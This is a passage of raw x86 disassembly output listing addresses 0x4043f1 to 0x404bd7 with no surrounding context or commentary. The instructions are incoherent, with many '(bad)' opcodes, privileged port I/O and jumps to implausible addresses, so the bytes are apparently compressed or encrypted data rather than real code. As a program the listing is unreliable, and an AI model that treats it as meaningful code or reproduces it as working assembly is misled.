  4043f1:	or     ebp,DWORD PTR [ecx-0x7454edcf]
  4043f7:	arpl   WORD PTR ds:0x391aa1ce,si
  4043fd:	jno    0x404467
  4043ff:	cmc    
  404400:	xchg   ebx,eax
  404401:	dec    esi
  404402:	jb     0x404472
  404404:	fbstp  TBYTE PTR [ebx+0x62f049a9]
  40440a:	cmp    al,al
  40440c:	rcl    bh,cl
  40440e:	or     eax,0xe0730993
  404413:	aad    0x10
  404415:	sbb    DWORD PTR [edx-0x29],eax
  404418:	(bad)  
  40441a:	imul   ecx,DWORD PTR [ebx-0x59],0xe67430c1
  404421:	inc    esi
  404422:	mov    dl,0xcf
  404424:	pop    edx
  404425:	cmp    eax,0x671572df
  40442a:	jb     0x404482
  40442c:	cdq    
  40442d:	inc    ebx
  40442e:	dec    esi
  40442f:	loope  0x4043d3
  404431:	std    
  404432:	iret   
  404433:	imul   esi,DWORD PTR [edx],0xffffffe3
  404436:	adc    DWORD PTR [ebx-0x27],esp
  404439:	mov    dh,0xc3
  40443b:	stos   DWORD PTR es:[edi],eax
  40443c:	xor    eax,0x3391a1ec
  404441:	jge    0x404413
  404443:	dec    esi
  404444:	adc    ah,0x9f
  404447:	sti    
  404448:	fld    st(2)
  40444a:	mov    bl,0xa
  40444c:	xchg   esi,eax
  40444d:	pushf  
  40444e:	in     al,0xe8
  404450:	lock div DWORD PTR [edx+eax*2-0x36]
  404455:	fs pop ebp
  404457:	pop    ds
  404458:	retf   
  404459:	sbb    ecx,ecx
  40445b:	pushf  
  40445c:	add    eax,0x5987c8e9
  404461:	jge    0x404460
  404463:	sub    dh,al
  404465:	dec    ebp
  404466:	outs   dx,BYTE PTR ds:[esi]
  404467:	inc    esi
  404468:	ret    
  404469:	jns    0x4044b6
  40446b:	mov    ebx,ecx
  40446d:	dec    edi
  40446e:	adc    BYTE PTR [edi],ch
  404470:	arpl   WORD PTR [esi-0x7d],bp
  404473:	mov    ebx,esp
  404475:	dec    ecx
  404476:	loopne 0x404492
  404478:	push   0xffffffb7
  40447a:	daa    
  40447b:	(bad)  
  40447c:	sbb    BYTE PTR [esi+0x5681ea03],ah
  404482:	hlt    
  404483:	mov    dh,0xe7
  404485:	sub    al,0xe7
  404487:	and    ebp,DWORD PTR [ecx+0x6f]
  40448a:	pop    esp
  40448b:	out    dx,eax
  40448c:	cmp    edi,edi
  40448e:	lock xrelease xor DWORD PTR [edx],ecx
  404492:	mov    dl,0x86
  404494:	sub    BYTE PTR [edx],cl
  404496:	adc    al,0xa2
  404498:	out    0x7e,eax
  40449a:	mov    dh,0xb9
  40449c:	cli    
  40449d:	sub    eax,0x20da7800
  4044a2:	outs   dx,DWORD PTR ds:[esi]
  4044a3:	jmp    0x7003bede
  4044a8:	call   0x6cd996d8
  4044ad:	dec    eax
  4044ae:	push   esi
  4044af:	in     eax,dx
  4044b0:	mov    ebp,0x8feab796
  4044b5:	sub    ecx,DWORD PTR gs:[edx+0x665f3a2f]
  4044bc:	scas   eax,DWORD PTR es:[edi]
  4044bd:	add    BYTE PTR [ecx-0x46],0x7d
  4044c1:	pushf  
  4044c2:	adc    dh,BYTE PTR [ecx-0x11f3c36e]
  4044c8:	cld    
  4044c9:	fcomp  DWORD PTR [ecx-0x6e1adf81]
  4044cf:	mov    ah,0xbe
  4044d1:	stc    
  4044d2:	jbe    0x404457
  4044d4:	mov    dl,0xf
  4044d6:	aad    0xa5
  4044d8:	in     eax,dx
  4044d9:	inc    ebp
  4044da:	lods   eax,DWORD PTR ds:[esi]
  4044db:	or     DWORD PTR [esi-0x30],edi
  4044de:	mov    edi,0x55b9f890
  4044e3:	out    0x45,eax
  4044e5:	and    cl,BYTE PTR [ecx+0x22]
  4044e8:	sub    al,0xfd
  4044ea:	bound  esp,QWORD PTR [edi-0x40]
  4044ed:	dec    eax
  4044ee:	shl    BYTE PTR [edx+0x51],cl
  4044f1:	fstp   TBYTE PTR [edx+0x11]
  4044f4:	sbb    BYTE PTR [ebx+0x2e96a964],dh
  4044fa:	sbb    cl,dh
  4044fc:	test   eax,0x2c4df132
  404501:	add    al,0x4
  404503:	mov    ebp,0x3a2edbb
  404508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404509:	adc    eax,ebx
  40450b:	dec    eax
  40450c:	push   eax
  40450d:	cmp    DWORD PTR [eax],eax
  40450f:	ficom  WORD PTR [eax+0x6178f9e0]
  404515:	addr16 inc edx
  404517:	mov    dh,BYTE PTR [eax+0x47]
  40451a:	das    
  40451b:	in     eax,0xb0
  40451d:	ret    0x527d
  404520:	fisubr WORD PTR [edx-0x48]
  404523:	fiadd  DWORD PTR [edi+0x5b]
  404526:	test   DWORD PTR [eax+0x5242e548],eax
  40452c:	out    0xc5,eax
  40452e:	in     al,dx
  40452f:	jle    0x4044f1
  404531:	fimul  DWORD PTR [ebp-0x5ea05a73]
  404537:	out    0xa8,al
  404539:	daa    
  40453a:	mov    eax,0x5347b55b
  40453f:	(bad)  
  404540:	in     eax,dx
  404541:	imul   ebp,DWORD PTR [edi+0x64fbdb25],0x8d7c6913
  40454b:	(bad)  
  40454d:	or     esi,DWORD PTR [edx-0x3c]
  404550:	cmp    al,0x43
  404552:	jp     0x404581
  404554:	std    
  404555:	shr    DWORD PTR [ebp+0x3e3bf41d],cl
  40455b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40455c:	bound  ebx,QWORD PTR [ecx+0x35]
  40455f:	ficom  WORD PTR [ecx-0x49b31a43]
  404565:	jnp    0x404599
  404567:	in     al,0x65
  404569:	adc    ch,BYTE PTR [esi-0x5]
  40456c:	daa    
  40456d:	in     eax,0x95
  40456f:	daa    
  404570:	dec    ebp
  404571:	pop    ss
  404572:	cmp    eax,0x492a569f
  404578:	popa   
  404579:	das    
  40457a:	repz bts DWORD PTR [edx*8+0x4c28f3a7],edi
  404583:	ficomp WORD PTR [esp+ecx*4+0x48]
  404587:	pop    ds
  404588:	stc    
  404589:	jmp    0x4045c5
  40458b:	(bad)  
  40458c:	cmc    
  40458d:	sbb    BYTE PTR [ebx],0xc1
  404590:	fisubr DWORD PTR [ecx]
  404592:	daa    
  404593:	cmp    al,0xae
  404595:	push   ss
  404596:	and    eax,0x3eb0569f
  40459b:	shl    DWORD PTR [eax+0x50],0xc5
  40459f:	add    eax,0xf9bd27e3
  4045a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045a5:	rcl    DWORD PTR [ebx+0x14b6d320],cl
  4045ab:	loop   0x404571
  4045ad:	jmp    0x5d59febf
  4045b2:	idiv   bh
  4045b4:	push   edx
  4045b5:	rcl    ebp,0xa6
  4045b8:	popa   
  4045b9:	add    edi,edi
  4045bb:	sbb    BYTE PTR [edi+esi*8+0x3b],bl
  4045bf:	or     bh,BYTE PTR [ecx+0x5a4851c]
  4045c5:	dec    ecx
  4045c6:	call   0x39f2:0x63a9e9dd
  4045cd:	push   ecx
  4045ce:	neg    BYTE PTR [ebx]
  4045d0:	fisttp QWORD PTR [ecx-0x26f786f1]
  4045d6:	scas   eax,DWORD PTR es:[edi]
  4045d7:	dec    ebp
  4045d8:	xchg   edx,ebx
  4045da:	sbb    eax,ebx
  4045dc:	sbb    eax,0x88a9de37
  4045e1:	es jb  0x404631
  4045e4:	mov    bh,0x7b
  4045e6:	fnstcw WORD PTR [esi+ebp*8+0x5f39d6b2]
  4045ed:	jo     0x4045a3
  4045ef:	mov    al,ds:0xb1845520
  4045f4:	adc    esi,ecx
  4045f6:	dec    eax
  4045f7:	mov    ds:0x48410bd,eax
  4045fc:	cmp    al,0x61
  4045fe:	daa    
  4045ff:	js     0x404581
  404601:	xor    al,0xfd
  404603:	idiv   dl
  404605:	out    dx,al
  404606:	jmp    0x4045e7
  404608:	aad    0xc2
  40460a:	bound  esi,QWORD PTR [edx]
  40460c:	ins    BYTE PTR es:[edi],dx
  40460d:	hlt    
  40460e:	inc    ebx
  40460f:	add    eax,0xd42075e1
  404614:	imul   esp,DWORD PTR [ebx+edi*8],0x3f
  404618:	pushf  
  404619:	push   0x2b286c83
  40461e:	jp     0x40463e
  404620:	push   0x71
  404622:	and    ch,BYTE PTR [edx+0x6598d178]
  404628:	add    esi,ecx
  40462a:	ins    BYTE PTR es:[edi],dx
  40462b:	ins    DWORD PTR es:[edi],dx
  40462c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40462d:	jno    0x4045bf
  40462f:	add    DWORD PTR [esi+0x48ca00fc],edx
  404635:	mov    esp,0xa8909393
  40463a:	leave  
  40463b:	out    dx,al
  40463c:	aaa    
  40463d:	ss call 0x1f5a0709
  404643:	stc    
  404644:	mov    WORD PTR [eax+0x3f84cef7],ds
  40464a:	mov    ebp,0xacfda612
  40464f:	and    bh,BYTE PTR [esi]
  404651:	in     al,dx
  404652:	xchg   BYTE PTR [eax+eiz*2+0x2b534ce],bl
  404659:	enter  0xccf2,0xea
  40465d:	jmp    DWORD PTR [ecx-0x3b]
  404660:	cdq    
  404661:	sub    eax,0xaef29d33
  404666:	pop    edx
  404667:	sub    BYTE PTR [eax-0x640e924d],al
  40466d:	pop    ebx
  40466e:	fs (bad) 
  404670:	mov    cl,0xe3
  404672:	pop    ecx
  404673:	fidiv  DWORD PTR [edi-0x61]
  404676:	cli    
  404677:	push   esi
  404678:	ret    0x34d5
  40467b:	jecxz  0x404668
  40467d:	sbb    ebx,DWORD PTR [edi+0x3e]
  404680:	outs   dx,BYTE PTR ds:[esi]
  404681:	jmp    0x40466b
  404683:	test   BYTE PTR [ecx+0x3155d94e],dh
  404689:	mov    ah,ah
  40468b:	push   cs
  40468c:	out    dx,al
  40468d:	mov    al,0xd1
  40468f:	mov    ebx,0x73b43b8a
  404694:	mov    esp,0x57749adb
  404699:	mov    ch,al
  40469b:	aaa    
  40469c:	(bad)  
  40469d:	and    DWORD PTR [esi],ebx
  40469f:	cmp    eax,0xe5909020
  4046a4:	call   0x2a56a6c8
  4046a9:	push   ebp
  4046aa:	inc    BYTE PTR [edx]
  4046ac:	call   0x47d4a4ad
  4046b1:	jecxz  0x40464d
  4046b3:	jb     0x40465b
  4046b5:	cmp    ecx,ebp
  4046b7:	test   ch,al
  4046b9:	neg    DWORD PTR [esi]
  4046bb:	jnp    0x40470c
  4046bd:	shr    esp,0xe4
  4046c0:	xchg   esp,eax
  4046c1:	jecxz  0x4046ca
  4046c3:	fmul   QWORD PTR [ebx+0x1fd8e04a]
  4046c9:	sbb    DWORD PTR [ebx],esi
  4046cb:	sub    BYTE PTR [esi],dh
  4046cd:	loop   0x40473a
  4046cf:	arpl   WORD PTR [eax-0x58],di
  4046d2:	cmc    
  4046d3:	js     0x404675
  4046d5:	xor    ecx,DWORD PTR [ebx]
  4046d7:	jbe    0x404716
  4046d9:	sbb    BYTE PTR [edx],dh
  4046db:	lods   al,BYTE PTR ds:[esi]
  4046dc:	pop    esp
  4046dd:	in     eax,dx
  4046de:	xor    edi,DWORD PTR ds:0xb49c7132
  4046e4:	xchg   esp,eax
  4046e5:	fdiv   QWORD PTR [ecx+eiz*4]
  4046e8:	shr    DWORD PTR [eax+0x55],1
  4046eb:	dec    esp
  4046ec:	std    
  4046ed:	js     0x404705
  4046ef:	aam    0x13
  4046f1:	outs   dx,DWORD PTR ds:[esi]
  4046f2:	jne    0x40468b
  4046f4:	outs   dx,BYTE PTR ds:[esi]
  4046f5:	mov    ebp,0x9685a627
  4046fa:	jmp    0xf52b509c
  4046ff:	adc    eax,0xbcd095ad
  404704:	mov    bl,0xd1
  404706:	pop    ebx
  404707:	pop    esi
  404708:	inc    edi
  404709:	mov    edx,0xf303cac0
  40470e:	shl    BYTE PTR [esp+edx*4-0x21],cl
  404712:	xchg   esi,eax
  404713:	(bad)  
  404714:	out    0x14,al
  404716:	xchg   DWORD PTR [eax+0x10],ebp
  404719:	sub    eax,0xef324648
  40471e:	or     eax,ebx
  404720:	call   0x4f1:0x7fafa8bb
  404727:	scas   eax,DWORD PTR es:[edi]
  404728:	(bad)  
  404729:	jns    0x40474e
  40472b:	dec    eax
  40472c:	xchg   BYTE PTR [ebx],bl
  40472e:	mov    ah,0x1e
  404730:	push   esp
  404731:	les    ebp,FWORD PTR [edi]
  404733:	ins    BYTE PTR es:[edi],dx
  404734:	mov    cl,0x76
  404736:	inc    edx
  404737:	and    eax,ebx
  404739:	sub    DWORD PTR [ebp-0x65d07545],esi
  40473f:	xor    edx,DWORD PTR [eax+0x36]
  404742:	push   ds
  404743:	xor    esp,DWORD PTR [edi+0x262bbe]
  404749:	shl    bh,1
  40474b:	mov    al,0x57
  40474d:	xor    dl,ch
  40474f:	loopne 0x404750
  404751:	imul   eax,DWORD PTR [eax-0x5b8ab85b],0x7d
  404758:	xlat   BYTE PTR ds:[ebx]
  404759:	xlat   BYTE PTR ds:[ebx]
  40475a:	xchg   edi,eax
  40475b:	jns    0x404794
  40475d:	push   ecx
  40475e:	test   eax,0x2343e34f
  404763:	jno    0x4047ad
  404765:	cmp    bh,cl
  404767:	or     eax,0x30a74240
  40476c:	push   esi
  40476d:	push   0xffffffb0
  40476f:	sbb    DWORD PTR [eax-0x1],edi
  404772:	ins    BYTE PTR es:[edi],dx
  404773:	fdiv   QWORD PTR [ebx-0x7db8e56a]
  404779:	inc    esi
  40477a:	leave  
  40477b:	jne    0x4047dc
  40477d:	cmc    
  40477e:	leave  
  40477f:	(bad)  
  404781:	pop    ds
  404782:	sahf   
  404783:	loope  0x4047ff
  404785:	mov    dh,0x19
  404787:	lods   eax,DWORD PTR ds:[esi]
  404788:	sbb    al,0x1c
  40478a:	sbb    eax,ebx
  40478c:	lea    eax,[esi+0x45]
  40478f:	xchg   DWORD PTR [ebp-0x5bb3edc3],ebp
  404795:	shr    BYTE PTR [edx],1
  404797:	out    dx,al
  404798:	loopne 0x404789
  40479a:	out    0x6b,al
  40479c:	lods   al,BYTE PTR ds:[esi]
  40479d:	test   eax,0x35aa03b8
  4047a2:	and    BYTE PTR [edi],bl
  4047a4:	adc    dl,BYTE PTR [eax+0x5d66969e]
  4047aa:	(bad)  
  4047ab:	ja     0x4047ae
  4047ad:	cld    
  4047ae:	xor    BYTE PTR [ebx-0x2baa602e],dh
  4047b4:	outs   dx,BYTE PTR ds:[esi]
  4047b5:	mov    cl,dh
  4047b7:	jbe    0x404818
  4047b9:	pop    ss
  4047ba:	mov    di,WORD PTR [eax-0x24]
  4047be:	or     ecx,esi
  4047c0:	and    al,0xfb
  4047c2:	or     BYTE PTR [edx+0x10],ch
  4047c5:	shr    BYTE PTR [edi+esi*2-0x1d],0xe5
  4047ca:	sbb    dh,BYTE PTR [edx+esi*4+0x7a]
  4047ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047cf:	sbb    esi,esi
  4047d1:	shld   DWORD PTR [edi],edi,cl
  4047d4:	sub    ch,BYTE PTR [edx]
  4047d6:	jmp    0x4047f6
  4047d8:	sar    al,1
  4047da:	iret   
  4047db:	inc    edi
  4047dc:	aas    
  4047dd:	shr    BYTE PTR [esi],0x9b
  4047e0:	and    al,0x98
  4047e2:	add    edx,DWORD PTR [ebx+edx*2+0x34d31c1]
  4047e9:	loop   0x404857
  4047eb:	pushf  
  4047ec:	cmp    eax,0xd678b2f5
  4047f1:	push   ds
  4047f2:	aam    0x5d
  4047f4:	xadd   DWORD PTR [ecx+0x78],ebp
  4047f8:	fwait
  4047f9:	inc    ecx
  4047fa:	(bad)  
  4047fc:	fwait
  4047fd:	cmp    eax,0x4b29c35e
  404802:	out    0xde,eax
  404804:	adc    DWORD PTR [ebx],ebx
  404806:	int3   
  404807:	jmp    0x3b97:0xc20b30d9
  40480e:	cdq    
  40480f:	add    BYTE PTR [ecx],0x8d
  404812:	sub    al,0xcf
  404814:	iret   
  404815:	pop    es
  404816:	idiv   DWORD PTR [esi-0x2f1c1042]
  40481c:	iret   
  40481d:	pop    eax
  40481e:	mov    ch,0xe3
  404820:	or     eax,0xe5fb1a45
  404825:	fcmovnb st,st(7)
  404827:	in     eax,dx
  404828:	jecxz  0x404835
  40482a:	push   cs
  40482b:	xor    al,0x67
  40482d:	xchg   esp,eax
  40482e:	pop    es
  40482f:	jns    0x40482f
  404831:	mov    ebp,ebx
  404833:	jle    0x404845
  404835:	mov    bh,BYTE PTR [ecx-0x2984d093]
  40483b:	mov    eax,0x3e416a0
  404840:	int    0xfe
  404842:	iret   
  404843:	out    0x9c,eax
  404845:	cmc    
  404846:	fisubr WORD PTR [ebx+0x181e654d]
  40484c:	mov    BYTE PTR [esi+edx*4-0x3f2dbb7c],ah
  404853:	pop    ds
  404854:	sbb    bh,BYTE PTR [eax-0x8]
  404857:	add    eax,0x928b6113
  40485c:	scas   eax,DWORD PTR es:[edi]
  40485d:	and    ebx,DWORD PTR [ecx]
  40485f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404860:	cmp    edi,DWORD PTR [ebp-0x540b39e1]
  404866:	xor    al,bl
  404868:	retf   0x4bc
  40486b:	mov    ch,0x3b
  40486d:	sub    ah,BYTE PTR [eax]
  40486f:	fld    QWORD PTR [ecx+0x6a]
  404872:	cli    
  404873:	pop    esi
  404874:	jle    0x4048de
  404876:	mov    eax,ds:0xaa10bdc1
  40487b:	mov    eax,0x2a4b04a1
  404880:	pop    ebx
  404881:	sbb    edx,DWORD PTR [ebx-0x34095111]
  404887:	jle    0x404899
  404889:	fild   WORD PTR [edx+eax*8+0xd]
  40488d:	in     al,dx
  40488e:	mov    esp,0xd8d8b3c7
  404893:	jg     0x404849
  404895:	jno    0x4048ae
  404897:	(bad)  
  404898:	shl    DWORD PTR [ebx+0x2999c7ea],0x23
  40489f:	into   
  4048a0:	fiadd  WORD PTR [ecx]
  4048a2:	mov    al,ds:0xe72fb372
  4048a7:	icebp  
  4048a8:	add    DWORD PTR [eax+ecx*4+0x23],ebp
  4048ac:	sar    BYTE PTR fs:[eax-0x67261d82],1
  4048b3:	rol    DWORD PTR [edi+ecx*1+0x43],cl
  4048b7:	or     bl,BYTE PTR [edi]
  4048b9:	xor    DWORD PTR [ebp-0x66],eax
  4048bc:	and    edi,DWORD PTR [eax+eiz*1-0x7fb5f77c]
  4048c3:	popa   
  4048c4:	test   DWORD PTR [ebp+0x380159ca],eax
  4048ca:	(bad)  
  4048cb:	and    ebx,DWORD PTR [esi-0x6f8870ce]
  4048d1:	arpl   WORD PTR [ebp-0x39746474],cx
  4048d7:	stc    
  4048d8:	loopne 0x40487c
  4048da:	rcl    DWORD PTR [ebp+0x20aa8205],0x25
  4048e1:	xlat   BYTE PTR ds:[ebx]
  4048e2:	and    esi,ebx
  4048e4:	hlt    
  4048e5:	lods   al,BYTE PTR ds:[esi]
  4048e6:	ror    ecx,cl
  4048e8:	push   ebx
  4048e9:	dec    ecx
  4048ea:	jmp    0x81bb9766
  4048ef:	int    0x19
  4048f1:	mov    eax,ds:0xdd371333
  4048f6:	ficomp WORD PTR [ecx-0x501bd11f]
  4048fc:	popa   
  4048fd:	scas   eax,DWORD PTR es:[edi]
  4048fe:	enter  0x8570,0xcc
  404902:	loopne 0x4048a1
  404904:	jmp    0x40489d
  404906:	push   0xffffffe8
  404908:	repz pop ds
  40490a:	sbb    eax,0xe622515f
  40490f:	mov    BYTE PTR [ebx],cl
  404911:	std    
  404912:	or     al,0xf5
  404914:	bound  ebp,QWORD PTR [ebx+0x6597025d]
  40491a:	pop    ecx
  40491b:	pusha  
  40491c:	sbb    DWORD PTR [esi+0x49f8efad],edx
  404922:	fstp   QWORD PTR [ebx+0x5b]
  404925:	ds push 0xf
  404928:	mov    ds:0x45ba56b9,eax
  40492d:	out    0xef,eax
  40492f:	inc    ecx
  404930:	push   DWORD PTR [edi]
  404932:	fistp  WORD PTR [ecx-0x60ee7480]
  404938:	cmp    al,0xf9
  40493a:	imul   ebp,DWORD PTR [edx-0x6c46bab8],0x8765c0b3
  404944:	sbb    ebp,edi
  404946:	mov    ebx,0x82149c9e
  40494b:	js     0x40491e
  40494d:	cmp    eax,0x26fb2e15
  404952:	jmp    0xcfc2:0x42929b05
  404959:	mov    ecx,0x6fdaaca7
  40495e:	jg     0x4048f5
  404960:	js     0x40499e
  404962:	sub    al,BYTE PTR [ebx+eiz*2+0x72]
  404966:	icebp  
  404967:	repz mov ch,0x6b
  40496a:	in     eax,dx
  40496b:	mov    ds:0xc85a0b97,eax
  404970:	and    ebp,ebp
  404972:	in     eax,0x24
  404974:	pushf  
  404975:	mov    cl,0x66
  404977:	inc    esi
  404978:	(bad)  
  404979:	out    0x74,al
  40497b:	and    ah,BYTE PTR [eax+0x14]
  40497e:	mov    ah,0x37
  404980:	inc    esp
  404981:	js     0x404906
  404983:	je     0x4049e2
  404985:	cmp    BYTE PTR [edi+0x1317b56b],al
  40498b:	retf   0xbe86
  40498e:	mov    cl,0xc8
  404990:	cmp    DWORD PTR [eax-0x7eb04b44],ebx
  404996:	cmp    edi,ebx
  404998:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40499a:	cs popa 
  40499c:	xchg   esi,eax
  40499d:	jp     0x404985
  40499f:	cwde   
  4049a0:	test   eax,0xa2ac23ef
  4049a6:	repnz int 0xe6
  4049a9:	jns    0x404a1b
  4049ab:	dec    edi
  4049ac:	leave  
  4049ad:	outs   dx,DWORD PTR ds:[esi]
  4049ae:	inc    edx
  4049af:	xor    ch,BYTE PTR [eax-0x7042c8ce]
  4049b5:	mov    al,ds:0xc1ef80c2
  4049ba:	xchg   edx,eax
  4049bb:	add    al,0xb1
  4049bd:	jno    0x40495e
  4049bf:	pop    ebp
  4049c0:	mov    ds:0x5aacc397,eax
  4049c5:	push   0xffffff99
  4049c7:	(bad)  
  4049c8:	repnz cmp eax,0x3321d217
  4049ce:	ss inc ebx
  4049d0:	cld    
  4049d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d2:	sub    eax,0x8109942
  4049d7:	ds popa 
  4049d9:	mov    ch,0xdb
  4049db:	cld    
  4049dc:	push   0x3b
  4049de:	push   ds
  4049df:	mov    edx,edi
  4049e1:	xchg   ebx,eax
  4049e2:	out    dx,eax
  4049e3:	dec    eax
  4049e4:	in     eax,dx
  4049e5:	sbb    ah,cl
  4049e7:	push   0xffffffb0
  4049e9:	lods   al,BYTE PTR ds:[esi]
  4049ea:	data16 mov es,WORD PTR [esi+0x666ae109]
  4049f1:	sbb    eax,0xf7c3f84
  4049f6:	sar    DWORD PTR [esi],0x92
  4049f9:	cmp    bh,BYTE PTR [edi+0x73]
  4049fc:	mov    ecx,0xaf6b20df
  404a01:	out    0x34,eax
  404a03:	push   ebx
  404a04:	into   
  404a05:	mov    dh,0x54
  404a07:	ret    
  404a08:	sti    
  404a09:	retf   0x5ce6
  404a0c:	inc    edx
  404a0d:	enter  0x1c00,0xf6
  404a11:	stc    
  404a12:	scas   eax,DWORD PTR es:[edi]
  404a13:	jmp    0x66ba2246
  404a18:	int    0xd0
  404a1a:	add    DWORD PTR [esi],0x6e6bebdd
  404a20:	jle    0x4049b6
  404a22:	cs push di
  404a25:	and    edi,DWORD PTR [eax+0x45]
  404a28:	stos   DWORD PTR es:[edi],eax
  404a29:	out    0x95,eax
  404a2b:	inc    ebp
  404a2c:	scas   al,BYTE PTR es:[edi]
  404a2d:	push   ebx
  404a2e:	cmp    bh,BYTE PTR [eax-0x55e42a14]
  404a34:	fisubr WORD PTR [edi-0xd5fd49d]
  404a3a:	pusha  
  404a3b:	in     eax,dx
  404a3c:	fs cwde 
  404a3e:	push   ds
  404a3f:	mov    edi,es
  404a41:	cs or  ch,0x9f
  404a45:	pushf  
  404a46:	popa   
  404a47:	popa   
  404a48:	nop
  404a49:	mov    edi,DWORD PTR [ebx]
  404a4b:	add    dh,BYTE PTR [ebx+0x1736d4c0]
  404a51:	scas   al,BYTE PTR es:[edi]
  404a52:	xor    DWORD PTR [ebp-0x1de54431],esp
  404a58:	xor    eax,0xc6c9ec77
  404a5d:	xchg   esi,ecx
  404a5f:	in     eax,0xbc
  404a61:	or     DWORD PTR [ecx],0x11eb2f65
  404a67:	sub    al,BYTE PTR [edi+0x19]
  404a6a:	imul   DWORD PTR [ebp-0x53d18fd9]
  404a70:	mov    ebp,0x3ecaad20
  404a75:	or     DWORD PTR [edi+ecx*2+0x40],edi
  404a79:	add    dl,dh
  404a7b:	rcl    BYTE PTR [eax+0x4b],1
  404a7e:	adc    ebp,DWORD PTR [ebp+0x69]
  404a81:	inc    edx
  404a82:	sti    
  404a83:	fcomp  QWORD PTR [esi+ebx*1-0x344e9e57]
  404a8a:	outs   dx,DWORD PTR ds:[esi]
  404a8b:	cmp    BYTE PTR [esi-0x212220a5],0x44
  404a92:	das    
  404a93:	test   DWORD PTR [edx],ebx
  404a95:	mov    ds:0x78d317d3,eax
  404a9a:	mov    ds:0xe8821e96,al
  404a9f:	outs   dx,BYTE PTR ds:[esi]
  404aa0:	push   edi
  404aa1:	pop    esp
  404aa2:	loopne 0x404a85
  404aa4:	fwait
  404aa5:	inc    ebp
  404aa6:	cli    
  404aa7:	adc    DWORD PTR ds:0x502ae0f0,0x63c93ed6
  404ab1:	dec    ecx
  404ab2:	mov    dl,0x28
  404ab4:	mov    ds:0x2d176eb9,al
  404ab9:	push   ds
  404aba:	lahf   
  404abb:	dec    ebp
  404abc:	xor    eax,0x3af8ceba
  404ac1:	popf   
  404ac2:	mov    ds:0xfb326582,eax
  404ac7:	push   cs
  404ac8:	enter  0x537c,0x53
  404acc:	aam    0x4b
  404ace:	adc    ecx,DWORD PTR [edx-0x4d]
  404ad1:	inc    ebp
  404ad2:	push   ds
  404ad3:	les    ebp,FWORD PTR ds:0x1cfe2463
  404ad9:	cmp    al,BYTE PTR [edx+eax*4]
  404adc:	add    BYTE PTR [ebx-0x16563bb6],bh
  404ae2:	fmul   DWORD PTR [edx-0x6510cb75]
  404ae8:	or     dl,BYTE PTR [eax]
  404aea:	jecxz  0x404ad8
  404aec:	push   es
  404aed:	adc    DWORD PTR [esi+eiz*1+0x3c6f07f3],edx
  404af4:	xor    ax,0x74cf
  404af8:	xchg   ebp,eax
  404af9:	push   0x3b
  404afb:	enter  0x45c6,0x4a
  404aff:	out    dx,eax
  404b00:	sub    eax,0x2a30bb2d
  404b05:	int    0xf9
  404b07:	(bad)  
  404b08:	icebp  
  404b09:	cwde   
  404b0a:	loop   0x404b55
  404b0c:	dec    ecx
  404b0d:	dec    eax
  404b0e:	int3   
  404b0f:	arpl   WORD PTR [ecx-0x6e6ef045],dx
  404b15:	fwait
  404b16:	cmc    
  404b17:	dec    eax
  404b18:	sub    ah,bh
  404b1a:	pop    ebx
  404b1b:	mov    ebx,0x4fc499c3
  404b20:	mov    ebp,0x281d3f03
  404b25:	cmc    
  404b26:	add    esi,DWORD PTR [ecx+edi*4+0x4d]
  404b2a:	pop    ecx
  404b2b:	xchg   DWORD PTR [ebx],edx
  404b2d:	imul   edx,DWORD PTR [ebx-0x3ef22465],0xffffffa9
  404b34:	sbb    ch,ah
  404b36:	dec    edx
  404b37:	sbb    BYTE PTR [edx-0x4c075f87],al
  404b3d:	std    
  404b3e:	fwait
  404b3f:	retf   
  404b40:	xchg   edx,eax
  404b41:	pop    edx
  404b42:	imul   ebp,DWORD PTR [edx+0xc6a684b],0x2e9e1396
  404b4c:	push   esi
  404b4d:	es mov ecx,gs
  404b50:	in     eax,0x20
  404b52:	clc    
  404b53:	call   FWORD PTR [ecx+0x5f5e0ca8]
  404b59:	xchg   ecx,eax
  404b5a:	inc    ebp
  404b5b:	out    0x38,al
  404b5d:	dec    eax
  404b5e:	xchg   bx,ax
  404b60:	jmp    0xe5bf9973
  404b65:	push   es
  404b66:	pop    eax
  404b67:	xor    dl,BYTE PTR [eax]
  404b69:	and    ecx,ebp
  404b6b:	nop
  404b6c:	jmp    0x404b27
  404b6e:	in     eax,dx
  404b6f:	aas    
  404b70:	push   ecx
  404b71:	retw   
  404b73:	test   al,0xc6
  404b75:	jg     0x404b5c
  404b77:	xor    eax,DWORD PTR [edi+0x7efc7840]
  404b7d:	in     eax,dx
  404b7e:	push   ecx
  404b7f:	call   0x5a3e74f8
  404b84:	cmc    
  404b85:	add    BYTE PTR [esi-0x79],ah
  404b88:	je     0x404b9d
  404b8a:	dec    esp
  404b8b:	add    al,0x94
  404b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b8e:	imul   esp
  404b90:	scas   eax,DWORD PTR es:[edi]
  404b91:	inc    esp
  404b92:	div    DWORD PTR [ebx+0x1f]
  404b95:	int    0xa7
  404b97:	mov    ebx,DWORD PTR [eax]
  404b99:	dec    edi
  404b9a:	cmp    ah,BYTE PTR [edi+0x8091130]
  404ba0:	pusha  
  404ba1:	pop    ebp
  404ba2:	imul   edx,DWORD PTR [esi],0xf3811f7e
  404ba8:	inc    esp
  404ba9:	push   ecx
  404baa:	lods   eax,DWORD PTR ds:[esi]
  404bab:	in     eax,dx
  404bac:	adc    bh,ah
  404bae:	test   al,0x63
  404bb0:	mov    al,0x15
  404bb2:	test   DWORD PTR [eax],edx
  404bb4:	pop    esp
  404bb5:	arpl   WORD PTR [ebx-0x4],dx
  404bb8:	xor    eax,0xf213f7d0
  404bbd:	js     0x404bac
  404bbf:	into   
  404bc0:	push   esp
  404bc1:	dec    ecx
  404bc2:	and    esp,ecx
  404bc4:	dec    esp
  404bc5:	stos   DWORD PTR es:[edi],eax
  404bc6:	lods   eax,DWORD PTR ds:[esi]
  404bc7:	push   ebp
  404bc8:	xor    dh,0x43
  404bcb:	imul   esi,DWORD PTR [ebx-0x1f385c09],0x855fab4
  404bd5:	xchg   ecx,eax
  404bd6:	xlat   BYTE PTR ds:[ebx]
  404bd7:	outs   dx,BYTE PTR ds:[esi]
